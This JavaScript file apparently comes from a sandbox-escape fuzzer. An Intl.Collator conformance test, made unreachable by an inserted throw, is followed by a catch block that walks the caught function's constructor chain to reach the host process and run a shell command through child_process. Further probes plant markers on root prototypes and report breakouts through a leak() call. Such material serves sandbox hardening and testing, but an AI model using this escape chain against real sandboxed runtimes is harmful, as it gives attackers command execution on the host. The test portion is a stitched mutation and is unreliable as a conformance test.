try {
    var extensions = [
        '-u-co-phonebk-kn',
        '-u-kn-co-phonebk',
        '-u-co-phonebk-kn-true',
        '-u-kn-true-co-phonebk'
    ];
    extensions.forEach(function (extension) {
        throw () => {
            return () => {
            };
        };
        var defaultLocale = new Intl.Collator().resolvedOptions().locale;
        var collator = new Intl.Collator([defaultLocale + extension], { usage: 'sort' });
        var locale = collator.resolvedOptions().locale;
        var numeric = collator.resolvedOptions().numeric;
        if (numeric !== undefined) {
            assert.sameValue(numeric, true, 'Default value for "kn" should be true, but is ' + numeric + '.');
            assert.sameValue(locale.indexOf('-kn-false'), -1, '"kn-false" is returned in locale, but shouldn\'t be.');
            assert.sameValue(locale.indexOf('-kn-true'), -1, '"kn-true" is returned in locale, but shouldn\'t be.');
            assert.sameValue(locale.indexOf('-kn') >= 0, true, '"kn" should be returned in locale.');
        }
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}